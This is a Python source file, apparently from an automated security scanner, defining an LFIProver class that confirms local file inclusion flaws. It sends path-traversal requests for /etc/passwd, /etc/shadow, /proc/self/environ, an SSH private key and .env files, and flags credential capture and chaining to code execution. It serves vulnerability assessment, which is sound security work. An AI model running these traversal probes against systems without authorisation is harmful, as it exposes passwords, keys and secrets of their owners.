"""
PHANTOM AI - LFI Prover

Proves LFI impact: can read sensitive files.
Extracted from scanning/exploit_proof_engine.py.
"""

from __future__ import annotations

from scanning.proof_engine.base_prover import BaseProver
from scanning.proof_engine.models import ProofResult

from utils.logger import get_logger

logger = get_logger(__name__)


class LFIProver(BaseProver):
    """Prove LFI impact: can read sensitive files."""

    async def prove(self, finding: dict) -> ProofResult:
        result = ProofResult()
        url = finding.get("matched_at", finding.get("host", ""))
        param = (finding.get("metadata") or {}).get("param", "")

        if not url:
            return ProofResult.not_attempted("missing_url")

        # --- Q1: Can I repeat? ---
        original_payload = (finding.get("metadata") or {}).get("payload", "")
        if original_payload and param:
            status, body, _ = await self._safe_request("GET", url, params={param: original_payload})
            if status == 200 and ("root:" in body or "[boot loader]" in body or "<?php" in body):
                result.can_repeat = True
                result.repeat_count = 1
                self._record_vector_attempt("lfi_repeat", True, original_payload[:30], url)
        else:
            status, body, _ = await self._safe_request("GET", url)
            if status > 0:
                result.can_repeat = True
                self._record_vector_attempt("lfi_repeat", True, "", url)

        # --- Q2: Can I mutate? (different files) ---
        if self.budget_remaining > 0 and result.can_repeat and param:
            sensitive_files = [
                ("passwd", "../../../etc/passwd"),
                ("shadow", "../../../etc/shadow"),
                ("env", "../../../proc/self/environ"),
                ("config", "../../../var/www/html/config.php"),
            ]
            for label, filepath in sensitive_files:
                if self.budget_remaining <= 0:
                    break
                status, body, _ = await self._safe_request("GET", url, params={param: filepath})
                if status == 200 and len(body) > 20:
                    if "root:" in body or "DOCUMENT_ROOT" in body or "<?php" in body or "password" in body.lower():
                        result.can_mutate = True
                        result.mutations.append(f"{label}: readable")
                        # THEME-15: Capture what was extracted
                        if "root:" in body:
                            result.data_extracted.append("System users from /etc/passwd")
                        if "password" in body.lower() or "secret" in body.lower():
                            result.data_extracted.append(f"Credentials/secrets from {filepath}")
                        result.impact_type = "DATA_LEAK"
                        self._record_vector_attempt(f"lfi_mutate_{label}", True, filepath, url)

        # --- Q3: Can I escalate? (read credentials, code) ---
        if self.budget_remaining > 0 and result.can_mutate and param:
            cred_files = [
                "../../../etc/shadow",
                "../../../home/user/.ssh/id_rsa",
                "../../../var/www/html/.env",
            ]
            for filepath in cred_files:
                if self.budget_remaining <= 0:
                    break
                status, body, _ = await self._safe_request("GET", url, params={param: filepath})
                if status == 200:
                    if "$6$" in body or "-----BEGIN" in body or "DB_PASSWORD" in body:
                        result.can_escalate = True
                        result.escalation = f"Sensitive credentials readable: {filepath}"
                        result.privilege_gained = "credential_access"
                        result.impact_type = "PRIVILEGE_ESCALATION"
                        self._record_vector_attempt("lfi_escalate_creds", True, filepath, url)
                        break

        # --- Q4: Can I chain? ---
        rce_findings = self._find_related_findings(["cmdi", "ssti", "deserialization"])
        if rce_findings:
            result.can_chain = True
            result.chain_targets.append("LFI + log poisoning or RCE = full server compromise")

        result.requests_used = self._requests_used
        return result.finalize()  # FIX P0-005: Calculate proof outcome and impact
